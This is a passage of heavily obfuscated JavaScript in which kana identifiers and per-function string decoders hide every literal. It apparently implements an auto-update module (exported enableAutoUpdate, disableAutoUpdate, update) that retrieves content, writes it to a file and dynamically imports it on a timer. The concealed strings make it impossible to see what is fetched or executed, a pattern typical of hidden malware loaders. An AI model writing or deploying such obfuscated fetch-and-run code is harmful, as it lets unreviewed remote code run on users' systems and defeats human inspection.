          'cDKOXjF3Pf%Ld"x/C|_wkgJIoZQpTi#v6auNRBU9.yzqS!tYr~;>VbHe2}hn]G,MA&0W$=)msE[45@7(+:1{8?<`*^l'),
        (にし[ふく[0xd]] = "" + (にし[ふく[0x3]] || "")),
        (にし[ふく[0x6]] = にし[ふく[0xd]].length),
        (にし[ふく[0xe]] = []),
        (にし[ふく[0x21]] = ふく[0x3]),
        (にし[ふく[0x17]] = ふく[0x3]),
        (にし[ふく[0x8]] = -ふく[0x1]),
      );
      for (
        にし[-ふく[0x34]] = ふく[0x3];
        にし[-ふく[0x34]] < にし[ふく[0x6]];
        にし[-ふく[0x34]]++
      ) {
        にし[ふく[0x2c]] = にし[ふく[0x35]].indexOf(
          にし[ふく[0xd]][にし[-ふく[0x34]]],
        );
        if (にし[ふく[0x2c]] === -ふく[0x1]) continue;
        if (にし[ふく[0x8]] < ふく[0x3]) {
          にし[ふく[0x8]] = にし[ふく[0x2c]];
        } else {
          すけ(
            (にし[ふく[0x8]] += にし[ふく[0x2c]] * ふく[0x20]),
            (にし[ふく[0x21]] |= にし[ふく[0x8]] << にし[ふく[0x17]]),
            (にし[ふく[0x17]] +=
              (にし[ふく[0x8]] & ふく[0x23]) > ふく[0x24]
                ? ふく[0x7]
                : ふく[0x25]),
          );
          do {
            すけ(
              にし[ふく[0xe]].push(にし[ふく[0x21]] & ふく[0xc]),
              (にし[ふく[0x21]] >>= ふく[0x4]),
              (にし[ふく[0x17]] -= ふく[0x4]),
            );
          } while (にし[ふく[0x17]] > ふく[0x8]);
          にし[ふく[0x8]] = -ふく[0x1];
        }
      }
      if (にし[ふく[0x8]] > -ふく[0x1]) {
        にし[ふく[0xe]].push(
          (にし[ふく[0x21]] | (にし[ふく[0x8]] << にし[ふく[0x17]])) &
            ふく[0xc],
        );
      }
      return らに(にし[ふく[0xe]]);
    }
    function しほ(...にし) {
      にし[ふく[0x0]] = ふく[0x1];
      if (typeof にく[にし[ふく[0x3]]] === ふく[0x11]) {
        return (にく[にし[ふく[0x3]]] = をて(ちこ[にし[ふく[0x3]]]));
      }
      return にく[にし[ふく[0x3]]];
    }
    throw new Error(しほ(0x61) + つと[しほ(0x62)]);
  }
  const くに = await つと[あく(0x63)]();
  await はよ[あく(0x64)](しく, くに, あく(0x65));
  return くに;
}
if (process[れを(0x66)][れを(0x67)](れを(0x68))) {
  try {
    すけ(きつ(よを), きつ(とて));
    function とて(...にし) {
      すけ(
        (にし[ふく[0x0]] = ふく[0x1]),
        (にし[ふく[0xf]] =
          'NupstGhTkrMebBOcHAoQSVJfjFYql:dL9=&6*xDn/,g7.2[}+`@%8<_13~;C5Ivy#(W]>mw?zZ$a{i4"XR|)K0PU!E^'),
        (にし[ふく[0xd]] = "" + (にし[ふく[0x3]] || "")),
        (にし[ふく[0x6]] = にし[ふく[0xd]].length),
        (にし[ふく[0xe]] = []),
        (にし[ふく[0x10]] = ふく[0x3]),
        (にし[ふく[0x17]] = ふく[0x3]),
        (にし[ふく[0x1f]] = -ふく[0x1]),
      );
      for (
        にし[ふく[0x4]] = ふく[0x3];
        にし[ふく[0x4]] < にし[ふく[0x6]];
        にし[ふく[0x4]]++
      ) {
        にし[ふく[0x1e]] = にし[ふく[0xf]].indexOf(
          にし[ふく[0xd]][にし[ふく[0x4]]],
        );
        if (にし[ふく[0x1e]] === -ふく[0x1]) continue;
        if (にし[ふく[0x1f]] < ふく[0x3]) {
          にし[ふく[0x1f]] = にし[ふく[0x1e]];
        } else {
          すけ(
            (にし[ふく[0x1f]] += にし[ふく[0x1e]] * ふく[0x20]),
            (にし[ふく[0x10]] |= にし[ふく[0x1f]] << にし[ふく[0x17]]),
            (にし[ふく[0x17]] +=
              (にし[ふく[0x1f]] & ふく[0x23]) > ふく[0x24]
                ? ふく[0x7]
                : ふく[0x25]),
          );
          do {
            すけ(
              にし[ふく[0xe]].push(にし[ふく[0x10]] & ふく[0xc]),
              (にし[ふく[0x10]] >>= ふく[0x4]),
              (にし[ふく[0x17]] -= ふく[0x4]),
            );
          } while (にし[ふく[0x17]] > ふく[0x8]);
          にし[ふく[0x1f]] = -ふく[0x1];
        }
      }
      if (にし[ふく[0x1f]] > -ふく[0x1]) {
        にし[ふく[0xe]].push(
          (にし[ふく[0x10]] | (にし[ふく[0x1f]] << にし[ふく[0x17]])) &
            ふく[0xc],
        );
      }
      return らに(にし[ふく[0xe]]);
    }
    function よを(...にし) {
      にし[ふく[0x0]] = ふく[0x1];
      if (typeof にく[にし[ふく[0x3]]] === ふく[0x11]) {
        return (にく[にし[ふく[0x3]]] = とて(ちこ[にし[ふく[0x3]]]));
      }
      return にく[にし[ふく[0x3]]];
    }
    const つそ = await こお();
    await なち();
    if (つそ) {
      await はよ[れを(0x69)](ほの, つそ, れを(0x6a));
    }
    すけ(
      console[れを(ふく[0x3a])](れを(0x6c)),
      process[よを(ふく[0x4d])](ふく[0x3]),
    );
  } catch (はつ) {
    すけ(きつ(のう), きつ(おひ));
    function おひ(...にし) {
      すけ(
        (にし[ふく[0x0]] = ふく[0x1]),
        (にし[ふく[0x1]] =
          '?lBNHaGLQw8e4A@R=vpI7d*,nk#9~izZh|2U1}[b5/gMsux;W.O&tFrC)jD+Pfy:]Y>V<^$JSo`06"%Xm_3!{cT(EKq'),
        (にし[ふく[0x2]] = "" + (にし[ふく[0x3]] || "")),
        (にし[ふく[0x6]] = にし[ふく[0x2]].length),
        (にし[ふく[0xb]] = []),
        (にし[ふく[0x21]] = ふく[0x3]),
        (にし[ふく[0xa]] = ふく[0x3]),
        (にし[ふく[0x1f]] = -ふく[0x1]),
      );
      for (
        にし[-ふく[0x2e]] = ふく[0x3];
        にし[-ふく[0x2e]] < にし[ふく[0x6]];
        にし[-ふく[0x2e]]++
      ) {
        にし[ふく[0x1e]] = にし[ふく[0x1]].indexOf(
          にし[ふく[0x2]][にし[-ふく[0x2e]]],
        );
        if (にし[ふく[0x1e]] === -ふく[0x1]) continue;
        if (にし[ふく[0x1f]] < ふく[0x3]) {
          にし[ふく[0x1f]] = にし[ふく[0x1e]];
        } else {
          すけ(
            (にし[ふく[0x1f]] += にし[ふく[0x1e]] * ふく[0x20]),
            (にし[ふく[0x21]] |= にし[ふく[0x1f]] << にし[ふく[0xa]]),
            (にし[ふく[0xa]] +=
              (にし[ふく[0x1f]] & ふく[0x23]) > ふく[0x24]
                ? ふく[0x7]
                : ふく[0x25]),
          );
          do {
            すけ(
              にし[ふく[0xb]].push(にし[ふく[0x21]] & ふく[0xc]),
              (にし[ふく[0x21]] >>= ふく[0x4]),
              (にし[ふく[0xa]] -= ふく[0x4]),
            );
          } while (にし[ふく[0xa]] > ふく[0x8]);
          にし[ふく[0x1f]] = -ふく[0x1];
        }
      }
      if (にし[ふく[0x1f]] > -ふく[0x1]) {
        にし[ふく[0xb]].push(
          (にし[ふく[0x21]] | (にし[ふく[0x1f]] << にし[ふく[0xa]])) &
            ふく[0xc],
        );
      }
      return らに(にし[ふく[0xb]]);
    }
    function のう(...にし) {
      にし[ふく[0x0]] = ふく[0x1];
      if (typeof にく[にし[ふく[0x3]]] === ふく[0x11]) {
        return (にく[にし[ふく[0x3]]] = おひ(ちこ[にし[ふく[0x3]]]));
      }
      return にく[にし[ふく[0x3]]];
    }
    すけ(
      console[れを(ふく[0x52])](のう(0x6f), はつ[のう(0x70)]),
      process[のう(0x71)](ふく[0x1]),
    );
  }
}
if (!にし(しく)) {
  すけ(きつ(とん), きつ(たよ));
  function たよ(...にし) {
    すけ(
      (にし[ふく[0x0]] = ふく[0x1]),
      (にし[-ふく[0x36]] =
        'Ty$KnJWFDrC:ax_u!0X]c.4kYg/EsRM"(B|PQ`@5A3L*&lIdOZb18VtifH#v~z[Shj=;%G29<UNomq^e,>7{)?w+}6p'),
      (にし[ふく[0x37]] = "" + (にし[ふく[0x3]] || "")),
      (にし[ふく[0x6]] = にし[ふく[0x37]].length),
      (にし[ふく[0xb]] = []),
      (にし[ふく[0x39]] = ふく[0x3]),
      (にし[ふく[0x17]] = ふく[0x3]),
      (にし[ふく[0x1f]] = -ふく[0x1]),
    );
    for (
      にし[ふく[0x38]] = ふく[0x3];
      にし[ふく[0x38]] < にし[ふく[0x6]];
      にし[ふく[0x38]]++
    ) {
      にし[ふく[0x1e]] = にし[-ふく[0x36]].indexOf(
        にし[ふく[0x37]][にし[ふく[0x38]]],
      );
      if (にし[ふく[0x1e]] === -ふく[0x1]) continue;
      if (にし[ふく[0x1f]] < ふく[0x3]) {
        にし[ふく[0x1f]] = にし[ふく[0x1e]];
      } else {
        すけ(
          (にし[ふく[0x1f]] += にし[ふく[0x1e]] * ふく[0x20]),
          (にし[ふく[0x39]] |= にし[ふく[0x1f]] << にし[ふく[0x17]]),
          (にし[ふく[0x17]] +=
            (にし[ふく[0x1f]] & ふく[0x23]) > ふく[0x24]
              ? ふく[0x7]
              : ふく[0x25]),
        );
        do {
          すけ(
            にし[ふく[0xb]].push(にし[ふく[0x39]] & ふく[0xc]),
            (にし[ふく[0x39]] >>= ふく[0x4]),
            (にし[ふく[0x17]] -= ふく[0x4]),
          );
        } while (にし[ふく[0x17]] > ふく[0x8]);
        にし[ふく[0x1f]] = -ふく[0x1];
      }
    }
    if (にし[ふく[0x1f]] > -ふく[0x1]) {
      にし[ふく[0xb]].push(
        (にし[ふく[0x39]] | (にし[ふく[0x1f]] << にし[ふく[0x17]])) & ふく[0xc],
      );
    }
    return らに(にし[ふく[0xb]]);
  }
  function とん(...にし) {
    にし[ふく[0x0]] = ふく[0x1];
    if (typeof にく[にし[ふく[0x3]]] === ふく[0x11]) {
      return (にく[にし[ふく[0x3]]] = たよ(ちこ[にし[ふく[0x3]]]));
    }
    return にく[にし[ふく[0x3]]];
  }
  console[れを(ふく[0x3a])](とん(0x72));
  try {
    const つそ = await こお();
    await なち();
    if (つそ) {
      すけ(きつ(あな), きつ(さう));
      function さう(...にし) {
        すけ(
          (にし[ふく[0x0]] = ふく[0x1]),
          (にし[ふく[0xf]] =
            'v8{5)&x43T*C~,SJ9hHoKE7rkF=j^gGpbBU_1Wu[>R`n<O2mA6i"NP/+.0Qs$!Mqc#w@Ze]dV}|YX?tz(%fly:aL;DI'),
          (にし[ふく[0x3b]] = "" + (にし[ふく[0x3]] || "")),
          (にし[ふく[0x6]] = にし[ふく[0x3b]].length),
          (にし[ふく[0x3e]] = []),
          (にし[ふく[0x3d]] = ふく[0x3]),
          (にし[ふく[0xa]] = ふく[0x3]),
          (にし[ふく[0x1f]] = -ふく[0x1]),
        );
        for (
          にし[ふく[0x38]] = ふく[0x3];
          にし[ふく[0x38]] < にし[ふく[0x6]];
          にし[ふく[0x38]]++
        ) {
          にし[-ふく[0x3c]] = にし[ふく[0xf]].indexOf(
            にし[ふく[0x3b]][にし[ふく[0x38]]],
          );
          if (にし[-ふく[0x3c]] === -ふく[0x1]) continue;
          if (にし[ふく[0x1f]] < ふく[0x3]) {
            にし[ふく[0x1f]] = にし[-ふく[0x3c]];
          } else {
            すけ(
              (にし[ふく[0x1f]] += にし[-ふく[0x3c]] * ふく[0x20]),
              (にし[ふく[0x3d]] |= にし[ふく[0x1f]] << にし[ふく[0xa]]),
              (にし[ふく[0xa]] +=
                (にし[ふく[0x1f]] & ふく[0x23]) > ふく[0x24]
                  ? ふく[0x7]
                  : ふく[0x25]),
            );
            do {
              すけ(
                にし[ふく[0x3e]].push(にし[ふく[0x3d]] & ふく[0xc]),
                (にし[ふく[0x3d]] >>= ふく[0x4]),
                (にし[ふく[0xa]] -= ふく[0x4]),
              );
            } while (にし[ふく[0xa]] > ふく[0x8]);
            にし[ふく[0x1f]] = -ふく[0x1];
          }
        }
        if (にし[ふく[0x1f]] > -ふく[0x1]) {
          にし[ふく[0x3e]].push(
            (にし[ふく[0x3d]] | (にし[ふく[0x1f]] << にし[ふく[0xa]])) &
              ふく[0xc],
          );
        }
        return らに(にし[ふく[0x3e]]);
      }
      function あな(...にし) {
        にし[ふく[0x0]] = ふく[0x1];
        if (typeof にく[にし[ふく[0x3]]] === ふく[0x11]) {
          return (にく[にし[ふく[0x3]]] = さう(ちこ[にし[ふく[0x3]]]));
        }
        return にく[にし[ふく[0x3]]];
      }
      await はよ[あな(0x73)](ほの, つそ, あな(0x74));
    }
  } catch (はつ) {
    console[とん(0x75)](とん(0x76), はつ[とん(ふく[0x4e])]);
  }
}
try {
  const つそ = await こお(),
    そな = await よれ();
  if (つそ && つそ !== そな) {
    すけ(きつ(つけ), きつ(をろ));
    function をろ(...にし) {
      すけ(
        (にし[ふく[0x0]] = ふく[0x1]),
        (にし[ふく[0x1]] =
          '2XDPpJUgeShI.1+Gt[*{=R%?VAWbaTm$,"du0QBfE^vNw/K_3LxC9H!:n>Y|<@o(4yFkz5)Z8sj`]r6lM&i}O~7;q#c'),
        (にし[ふく[0x2]] = "" + (にし[ふく[0x3]] || "")),
        (にし[ふく[0x5]] = にし[ふく[0x2]].length),
        (にし[ふく[0xe]] = []),
        (にし[ふく[0x21]] = ふく[0x3]),
        (にし[ふく[0x3f]] = ふく[0x3]),
        (にし[ふく[0x1f]] = -ふく[0x1]),
      );
      for (
        にし[ふく[0x40]] = ふく[0x3];
        にし[ふく[0x40]] < にし[ふく[0x5]];
        にし[ふく[0x40]]++
      ) {
        にし[-ふく[0x41]] = にし[ふく[0x1]].indexOf(
          にし[ふく[0x2]][にし[ふく[0x40]]],
        );
        if (にし[-ふく[0x41]] === -ふく[0x1]) continue;
        if (にし[ふく[0x1f]] < ふく[0x3]) {
          にし[ふく[0x1f]] = にし[-ふく[0x41]];
        } else {
          すけ(
            (にし[ふく[0x1f]] += にし[-ふく[0x41]] * ふく[0x20]),
            (にし[ふく[0x21]] |= にし[ふく[0x1f]] << にし[ふく[0x3f]]),
            (にし[ふく[0x3f]] +=
              (にし[ふく[0x1f]] & ふく[0x23]) > ふく[0x24]
                ? ふく[0x7]
                : ふく[0x25]),
          );
          do {
            すけ(
              にし[ふく[0xe]].push(にし[ふく[0x21]] & ふく[0xc]),
              (にし[ふく[0x21]] >>= ふく[0x4]),
              (にし[ふく[0x3f]] -= ふく[0x4]),
            );
          } while (にし[ふく[0x3f]] > ふく[0x8]);
          にし[ふく[0x1f]] = -ふく[0x1];
        }
      }
      if (にし[ふく[0x1f]] > -ふく[0x1]) {
        にし[ふく[0xe]].push(
          (にし[ふく[0x21]] | (にし[ふく[0x1f]] << にし[ふく[0x3f]])) &
            ふく[0xc],
        );
      }
      return らに(にし[ふく[0xe]]);
    }
    function つけ(...にし) {
      にし[ふく[0x0]] = ふく[0x1];
      if (typeof にく[にし[ふく[0x3]]] === ふく[0x11]) {
        return (にく[にし[ふく[0x3]]] = をろ(ちこ[にし[ふく[0x3]]]));
      }
      return にく[にし[ふく[0x3]]];
    }
    すけ(await なち(), await はよ[つけ(0x78)](ほの, つそ, つけ(0x79)));
  }
} catch {}
let にゆ = await import(
    をて(しく)[れを(0x7a)] + (れを(ふく[0x2e]) + Date[れを(0x7c)]())
  ),
  こん = ふく[0x2f],
  てゆ = ふく[0x2f];
async function てこ() {
  try {
    すけ(きつ(あく), きつ(にし));
    function にし(...にし) {
      すけ(
        (にし[ふく[0x0]] = ふく[0x1]),
        (にし[ふく[0xf]] =
          '&NfeXaODkCZIFGAdWHjTpqPJYcBghri=|RvumU56!V3bnS$MKxyE(lL?%[8Qw*2):o~#+s,]>_/^t14<@9.7}z"{;`0'),
        (にし[ふく[0xd]] = "" + (にし[ふく[0x3]] || "")),
        (にし[ふく[0x5]] = にし[ふく[0xd]].length),
        (にし[ふく[0x43]] = []),
        (にし[ふく[0x10]] = ふく[0x3]),
        (にし[ふく[0xa]] = ふく[0x3]),
        (にし[ふく[0x1f]] = -ふく[0x1]),
      );
      for (
        にし[ふく[0x38]] = ふく[0x3];
        にし[ふく[0x38]] < にし[ふく[0x5]];
        にし[ふく[0x38]]++
      ) {
        にし[ふく[0x42]] = にし[ふく[0xf]].indexOf(
          にし[ふく[0xd]][にし[ふく[0x38]]],
        );
        if (にし[ふく[0x42]] === -ふく[0x1]) continue;
        if (にし[ふく[0x1f]] < ふく[0x3]) {
          にし[ふく[0x1f]] = にし[ふく[0x42]];
        } else {
          すけ(
            (にし[ふく[0x1f]] += にし[ふく[0x42]] * ふく[0x20]),
            (にし[ふく[0x10]] |= にし[ふく[0x1f]] << にし[ふく[0xa]]),
            (にし[ふく[0xa]] +=
              (にし[ふく[0x1f]] & ふく[0x23]) > ふく[0x24]
                ? ふく[0x7]
                : ふく[0x25]),
          );
          do {
            すけ(
              にし[ふく[0x43]].push(にし[ふく[0x10]] & ふく[0xc]),
              (にし[ふく[0x10]] >>= ふく[0x4]),
              (にし[ふく[0xa]] -= ふく[0x4]),
            );
          } while (にし[ふく[0xa]] > ふく[0x8]);
          にし[ふく[0x1f]] = -ふく[0x1];
        }
      }
      if (にし[ふく[0x1f]] > -ふく[0x1]) {
        にし[ふく[0x43]].push(
          (にし[ふく[0x10]] | (にし[ふく[0x1f]] << にし[ふく[0xa]])) &
            ふく[0xc],
        );
      }
      return らに(にし[ふく[0x43]]);
    }
    function あく(...あく) {
      あく[ふく[0x0]] = ふく[0x1];
      if (typeof にく[あく[ふく[0x3]]] === ふく[0x11]) {
        return (にく[あく[ふく[0x3]]] = にし(ちこ[あく[ふく[0x3]]]));
      }
      return にく[あく[ふく[0x3]]];
    }
    const つと = await こお();
    if (!つと) {
      return;
    }
    const しほ = await よれ();
    console[れを(ふく[0x3a])](つと, しほ, しほ == つと);
    if (つと === しほ) {
      return;
    }
    すけ(
      await なち(),
      await はよ[あく(ふく[0x40])](ほの, つと, あく(0x7e)),
      (にゆ = await import(
        をて(しく)[あく(ふく[0x3f])] +
          (あく(ふく[0x36]) + Date[あく(ふく[0x27])]())
      )),
      console[あく(0x82)](
        あく(0x83) +
          (しほ?.slice(ふく[0x3], ふく[0x8]) || あく(ふく[0x56])) +
          あく(0x85) +
          つと[あく(0x86)](ふく[0x3], ふく[0x8]) +
          ふく[0x4c],
      ),
    );
    if (てゆ) {
      すけ(きつ(とに), きつ(くに));
      function くに(...にし) {
        すけ(
          (にし[ふく[0x0]] = ふく[0x1]),
          (にし[-ふく[0x44]] =
            'AqtBekHXdEIpxKVTCj2fY(14oDSbURNiFa&h/Ml{L`mO.+c<gvsnG!JZ|QyWz_8P]~05^@>=7,6?"#w:u9);%*}3r[$'),
          (にし[ふく[0x2]] = "" + (にし[ふく[0x3]] || "")),
          (にし[ふく[0x6]] = にし[ふく[0x2]].length),
          (にし[ふく[0xb]] = []),
          (にし[-ふく[0x45]] = ふく[0x3]),
          (にし[ふく[0x17]] = ふく[0x3]),
          (にし[ふく[0x8]] = -ふく[0x1]),
        );
        for (
          にし[-ふく[0x1b]] = ふく[0x3];
          にし[-ふく[0x1b]] < にし[ふく[0x6]];
          にし[-ふく[0x1b]]++
        ) {
          にし[ふく[0x2c]] = にし[-ふく[0x44]].indexOf(
            にし[ふく[0x2]][にし[-ふく[0x1b]]],
          );
          if (にし[ふく[0x2c]] === -ふく[0x1]) continue;
          if (にし[ふく[0x8]] < ふく[0x3]) {
            にし[ふく[0x8]] = にし[ふく[0x2c]];
          } else {
            すけ(
              (にし[ふく[0x8]] += にし[ふく[0x2c]] * ふく[0x20]),
              (にし[-ふく[0x45]] |= にし[ふく[0x8]] << にし[ふく[0x17]]),
              (にし[ふく[0x17]] +=
                (にし[ふく[0x8]] & ふく[0x23]) > ふく[0x24]
                  ? ふく[0x7]
                  : ふく[0x25]),
            );
            do {
              すけ(
                にし[ふく[0xb]].push(にし[-ふく[0x45]] & ふく[0xc]),
                (にし[-ふく[0x45]] >>= ふく[0x4]),
                (にし[ふく[0x17]] -= ふく[0x4]),
              );
            } while (にし[ふく[0x17]] > ふく[0x8]);
            にし[ふく[0x8]] = -ふく[0x1];
          }
        }
        if (にし[ふく[0x8]] > -ふく[0x1]) {
          にし[ふく[0xb]].push(
            (にし[-ふく[0x45]] | (にし[ふく[0x8]] << にし[ふく[0x17]])) &
              ふく[0xc],
          );
        }
        return らに(にし[ふく[0xb]]);
      }
      function とに(...にし) {
        にし[ふく[0x0]] = ふく[0x1];
        if (typeof にく[にし[ふく[0x3]]] === ふく[0x11]) {
          return (にく[にし[ふく[0x3]]] = くに(ちこ[にし[ふく[0x3]]]));
        }
        return にく[にし[ふく[0x3]]];
      }
      てゆ(とに(0x87), つと);
    }
  } catch {}
}
export function enableAutoUpdate(にし = 0xea60, onUpdate) {
  disableAutoUpdate();
  if (onUpdate) {
    てゆ = onUpdate;
  }
  すけ(
    (こん = setInterval(てこ, にし)),
    console[れを(ふく[0x3a])](れを(0x88) + にし + れを(0x89)),
  );
}
export function disableAutoUpdate() {
  if (こん) {
    すけ(clearInterval(こん), (こん = ふく[0x2f]));
  }
  てゆ = ふく[0x2f];
}
export async function update(onReload) {
  try {
    すけ(きつ(あく), きつ(にし));
    function にし(...onReload) {
      すけ(
        (onReload[ふく[0x0]] = ふく[0x1]),
        (onReload[ふく[0x47]] =
          '5u#^<YH72ZV(1k:]yv|@4wp8rA9SMPFo>gt&B~3"iL+CczmWxnaQUdK.XTq[hIERb%;GNjl_*6)JD/!}=O0e?$f{`,s'),
        (onReload[ふく[0xd]] = "" + (onReload[ふく[0x3]] || "")),
        (onReload[ふく[0x6]] = onReload[ふく[0xd]].length),
        (onReload[ふく[0xb]] = []),
        (onReload[ふく[0x10]] = ふく[0x3]),
        (onReload[-ふく[0x46]] = ふく[0x3]),
        (onReload[ふく[0x48]] = -ふく[0x1]),
      );
      for (
        onReload[ふく[0x38]] = ふく[0x3];
        onReload[ふく[0x38]] < onReload[ふく[0x6]];
        onReload[ふく[0x38]]++
      ) {
        onReload[ふく[0x2c]] = onReload[ふく[0x47]].indexOf(
          onReload[ふく[0xd]][onReload[ふく[0x38]]],
        );
        if (onReload[ふく[0x2c]] === -ふく[0x1]) continue;
        if (onReload[ふく[0x48]] < ふく[0x3]) {
          onReload[ふく[0x48]] = onReload[ふく[0x2c]];
        } else {
          すけ(
            (onReload[ふく[0x48]] += onReload[ふく[0x2c]] * ふく[0x20]),
            (onReload[ふく[0x10]] |=
              onReload[ふく[0x48]] << onReload[-ふく[0x46]]),
            (onReload[-ふく[0x46]] +=
              (onReload[ふく[0x48]] & ふく[0x23]) > ふく[0x24]
                ? ふく[0x7]
                : ふく[0x25]),
          );
          do {
            すけ(
              onReload[ふく[0xb]].push(onReload[ふく[0x10]] & ふく[0xc]),
              (onReload[ふく[0x10]] >>= ふく[0x4]),
              (onReload[-ふく[0x46]] -= ふく[0x4]),
            );
          } while (onReload[-ふく[0x46]] > ふく[0x8]);
          onReload[ふく[0x48]] = -ふく[0x1];
        }
      }
      if (onReload[ふく[0x48]] > -ふく[0x1]) {
        onReload[ふく[0xb]].push(
          (onReload[ふく[0x10]] |
            (onReload[ふく[0x48]] << onReload[-ふく[0x46]])) &
            ふく[0xc],
        );
      }
      return らに(onReload[ふく[0xb]]);
    }
    function あく(...onReload) {
      onReload[ふく[0x0]] = ふく[0x1];
      if (typeof にく[onReload[ふく[0x3]]] === ふく[0x11]) {
        return (にく[onReload[ふく[0x3]]] = にし(ちこ[onReload[ふく[0x3]]]));
      }
      return にく[onReload[ふく[0x3]]];
    }
    const つと = await こお();
    await なち();
    if (つと) {
      すけ(きつ(くに), きつ(しほ));
      function しほ(...onReload) {
        すけ(
          (onReload[ふく[0x0]] = ふく[0x1]),
          (onReload[ふく[0xf]] =
            '+AgcMrkIN36h`SE"dys#.tHe!T>uODp/K1n&<%(q_FC?JB8Q|P0W:9iv$7{a^j4,5@RwX)om*zYb2;]ZGlV[~}UL=xf'),
          (onReload[ふく[0x2]] = "" + (onReload[ふく[0x3]] || "")),
          (onReload[-ふく[0x4a]] = onReload[ふく[0x2]].length),
          (onReload[ふく[0xb]] = []),
          (onReload[ふく[0x10]] = ふく[0x3]),
          (onReload[ふく[0x4b]] = ふく[0x3]),
          (onReload[ふく[0x8]] = -ふく[0x1]),
        );
        for (
          onReload[-ふく[0x49]] = ふく[0x3];
          onReload[-ふく[0x49]] < onReload[-ふく[0x4a]];
          onReload[-ふく[0x49]]++
        ) {
          onReload[ふく[0x2c]] = onReload[ふく[0xf]].indexOf(
            onReload[ふく[0x2]][onReload[-ふく[0x49]]],
          );
          if (onReload[ふく[0x2c]] === -ふく[0x1]) continue;
          if (onReload[ふく[0x8]] < ふく[0x3]) {
            onReload[ふく[0x8]] = onReload[ふく[0x2c]];
          } else {
            すけ(
              (onReload[ふく[0x8]] += onReload[ふく[0x2c]] * ふく[0x20]),
              (onReload[ふく[0x10]] |=
                onReload[ふく[0x8]] << onReload[ふく[0x4b]]),
              (onReload[ふく[0x4b]] +=
                (onReload[ふく[0x8]] & ふく[0x23]) > ふく[0x24]
                  ? ふく[0x7]
                  : ふく[0x25]),
            );
            do {
              すけ(
                onReload[ふく[0xb]].push(onReload[ふく[0x10]] & ふく[0xc]),
                (onReload[ふく[0x10]] >>= ふく[0x4]),
                (onReload[ふく[0x4b]] -= ふく[0x4]),
              );
            } while (onReload[ふく[0x4b]] > ふく[0x8]);
            onReload[ふく[0x8]] = -ふく[0x1];
          }
        }
        if (onReload[ふく[0x8]] > -ふく[0x1]) {
          onReload[ふく[0xb]].push(
            (onReload[ふく[0x10]] |
              (onReload[ふく[0x8]] << onReload[ふく[0x4b]])) &
              ふく[0xc],
          );
        }
        return らに(onReload[ふく[0xb]]);
      }
      function くに(...onReload) {
        onReload[ふく[0x0]] = ふく[0x1];
        if (typeof にく[onReload[ふく[0x3]]] === ふく[0x11]) {
          return (にく[onReload[ふく[0x3]]] = しほ(ちこ[onReload[ふく[0x3]]]));
        }
        return にく[onReload[ふく[0x3]]];
      }
      await はよ[くに(0x8a)](ほの, つと, くに(0x8b));
    }
    すけ(
      (にゆ = await import(
        をて(しく)[あく(0x8c)] + (あく(0x8d) + Date[あく(ふく[0x1c])]())
      )),
      console[あく(0x8f)](
        あく(0x90) +
          (つと?.slice(ふく[0x3], ふく[0x8]) || あく(0x91)) +
          ふく[0x4c],
      ),
    );
    if (onReload) {
      onReload(にゆ);
    }
  } catch (とに) {
    すけ(きつ(れた), きつ(へけ));
    function へけ(...onReload) {
      すけ(
        (onReload[ふく[0x0]] = ふく[0x1]),
        (onReload[ふく[0x1]] =
          '$/Y:2DCl]o83bzx5;GQhJm0=9&O}c_HXSa.64KTV+{u|g(1WjBMspn%qAedyR)<#"I@NkEvi7^`>P[LtU,?~FZwr*!f'),
        (onReload[ふく[0xd]] = "" + (onReload[ふく[0x3]] || "")),
        (onReload[ふく[0x4f]] = onReload[ふく[0xd]].length),
        (onReload[-ふく[0x51]] = []),
        (onReload[ふく[0x21]] = ふく[0x3]),
        (onReload[-ふく[0x4d]] = ふく[0x3]),
        (onReload[ふく[0x4e]] = -ふく[0x1]),
      );
      for (
        onReload[ふく[0x38]] = ふく[0x3];
        onReload[ふく[0x38]] < onReload[ふく[0x4f]];
        onReload[ふく[0x38]]++
      ) {
        onReload[-ふく[0x50]] = onReload[ふく[0x1]].indexOf(
          onReload[ふく[0xd]][onReload[ふく[0x38]]],
        );
        if (onReload[-ふく[0x50]] === -ふく[0x1]) continue;
        if (onReload[ふく[0x4e]] < ふく[0x3]) {
          onReload[ふく[0x4e]] = onReload[-ふく[0x50]];
        } else {
          すけ(
            (onReload[ふく[0x4e]] += onReload[-ふく[0x50]] * ふく[0x20]),
            (onReload[ふく[0x21]] |=
              onReload[ふく[0x4e]] << onReload[-ふく[0x4d]]),
            (onReload[-ふく[0x4d]] +=
              (onReload[ふく[0x4e]] & ふく[0x23]) > ふく[0x24]
                ? ふく[0x7]
                : ふく[0x25]),
          );
          do {
            すけ(
              onReload[-ふく[0x51]].push(onReload[ふく[0x21]] & ふく[0xc]),
              (onReload[ふく[0x21]] >>= ふく[0x4]),
              (onReload[-ふく[0x4d]] -= ふく[0x4]),
            );
          } while (onReload[-ふく[0x4d]] > ふく[0x8]);
          onReload[ふく[0x4e]] = -ふく[0x1];
        }
      }
      if (onReload[ふく[0x4e]] > -ふく[0x1]) {
        onReload[-ふく[0x51]].push(
          (onReload[ふく[0x21]] |
            (onReload[ふく[0x4e]] << onReload[-ふく[0x4d]])) &
            ふく[0xc],
        );
      }
      return らに(onReload[-ふく[0x51]]);
    }
    function れた(...onReload) {
      onReload[ふく[0x0]] = ふく[0x1];
      if (typeof にく[onReload[ふく[0x3]]] === ふく[0x11]) {
        return (にく[onReload[ふく[0x3]]] = へけ(ちこ[onReload[ふく[0x3]]]));
      }
      return にく[onReload[ふく[0x3]]];
    }
    console[れを(ふく[0x52])](れを(0x92), とに[れた(0x93)]);
  }
}
function とる(...にし) {
  すけ(きつ(はよ), きつ(あく));
  function あく(...にし) {
    すけ(
      (にし[ふく[0x0]] = ふく[0x1]),
      (にし[ふく[0x54]] =
        'k5CmZGMaVAnQO,J6;w"0$?T{hIKP~^xFUBr.R<DW|Yj1H@z:`pvid}y+t_ou7s3=l/eXc2E]bgf!L49q)#&S%N>([*8'),
      (にし[-ふく[0x53]] = "" + (にし[ふく[0x3]] || "")),
      (にし[ふく[0x6]] = にし[-ふく[0x53]].length),
      (にし[ふく[0xe]] = []),
      (にし[ふく[0x10]] = ふく[0x3]),
      (にし[ふく[0x42]] = ふく[0x3]),
      (にし[ふく[0x1f]] = -ふく[0x1]),
    );
    for (
      にし[ふく[0x4]] = ふく[0x3];
      にし[ふく[0x4]] < にし[ふく[0x6]];
      にし[ふく[0x4]]++
    ) {
      にし[ふく[0x2c]] = にし[ふく[0x54]].indexOf(
        にし[-ふく[0x53]][にし[ふく[0x4]]],
      );
      if (にし[ふく[0x2c]] === -ふく[0x1]) continue;
